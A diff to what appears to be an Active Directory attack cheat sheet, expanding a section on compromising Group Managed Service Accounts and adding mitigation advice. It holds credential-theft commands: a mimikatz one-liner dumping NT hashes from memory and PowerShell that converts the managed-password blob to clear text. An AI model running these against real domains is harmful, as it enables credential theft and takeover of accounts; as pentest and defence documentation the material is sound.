@@ -2138,7 +2138,12 @@ laZagne.exe
 
 The goal is to compromised one of those accounts to get their rights.
 
-The **msDS-ManagedPassword** attribute contains a BLOB with password information for group-managed service accounts.
+Group Managed Service Accounts have the object class [msDS-GroupManagedServiceAccount](https://docs.microsoft.com/en-us/windows/win32/adschema/c-msds-groupmanagedserviceaccount) and associated attributes specific to GMSAs. These properties include:
+
+- **msDS-GroupMSAMembership** (PrincipalsAllowedToRetrieveManagedPassword) attribute controls who can request and receive the clear-text password.
+- **msds-ManagedPassword** attribute contains a BLOB with password information for group-managed service accounts.
+- **msDS-ManagedPasswordId** attribute contains the key identifier for the current managed password data for a group MSA.
+- **msDS-ManagedPasswordInterval** attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.
 
 [Get-ADServiceAccount] gets a managed service account (MSA) or performs a search to retrieve MSAs.
 
@@ -2148,10 +2153,24 @@ We can perform the following in order to see:
 - When the password will be changed, ...
 
 ```powershell
-Get-ADServiceAccount -Filter {name -eq 'NAME'} -properties *
+Get-ADServiceAccount -Filter {name -eq 'NAME'} -properties * | Select Name, DNSHostname, MemberOf, Created, LastLogonData, PasswordLastSet, msDS-ManagedPasswordInterval, PrincipalsAllowedToDelegateToAccount, PrincipalsAllowedToRetreiveManagedPassword, msDS-ManagedPassword, ServicePrincipalNames
 ```
 
-The **msDS-GroupMSAMembership** (PrincipalsAllowedToRetrieveManagedPassword) attribute controls who can request and receive the clear-text password.
+If we do then an "Get-ADComputer" on the Computer that is specified within *ServicePrincipalNames*, we can get more information about it.
+The goal is then to move to that server use Mimikatz to get the password of the GSMA
+
+```bash
+# Getting the NT password hash
+mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
+```
+
+We can then see which group we can compromise with that password hash
+
+```powershell
+Get-ADGroupMember 'CN=GMSA GROUP' | Select DistinguishedName, objectClass | sort objectClass
+```
+
+Once we compromise a user or computer account that has the ability to pull the clear text password, we can do the following to get the password in clear text.
 
 ```powershell
 # Save the blob to a variable
@@ -2162,15 +2181,11 @@ $mp = $gmsa.'msDS-ManagedPassword'
 ConvertFrom-ADManagedPasswordBlob $mp
 ```
 
-To retreive the hash from a SPN, we can do the following using mimikatz
+:white_check_mark: How to protect against or detect that technique:
 
-```bash
-mimikatz.exe
-mimikatz # privilege::debug     # Ask for debug privilege for mimikatz process.
-mimikatz # sekurlsa::ekeys      #    
-```
-
-With this password hash, we can perform pass the hash to compromise the Active Directory.
+- *Architecture*: Determine rights actually required and ensure the only the required, limited rights apply to the GMSA.
+- *Architecture*: Use the list privilege principle, for instance don't give Active Directory rights to the GMSAs unless they are limited to the Domain Controllers.
+- *Architecture*: Limit Group Managed Service Accounts access and location
 
 ##### Brute-force
 
